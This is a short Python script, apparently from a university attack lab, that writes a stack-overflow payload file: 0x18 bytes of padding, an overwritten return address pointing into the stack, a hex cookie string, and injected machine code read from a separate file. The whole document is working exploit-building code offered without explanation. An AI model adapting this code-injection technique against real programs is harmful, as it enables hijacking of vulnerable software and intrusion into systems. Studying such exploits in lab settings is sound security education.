import struct

cookie = 0x3E52DFF5
stack_addr = 0x55629F40

with open("phase3_payload.bin", "wb") as outfile, open(
    "phase3_code.bin", "rb"
) as infile:
    outfile.write(b"A" * 0x18)
    cookie_hex = f"{cookie:8x}".encode() + b"\x00"
    outfile.write(struct.pack("<q", stack_addr + 8 + len(cookie_hex)))
    outfile.write(cookie_hex)
    outfile.write(infile.read())
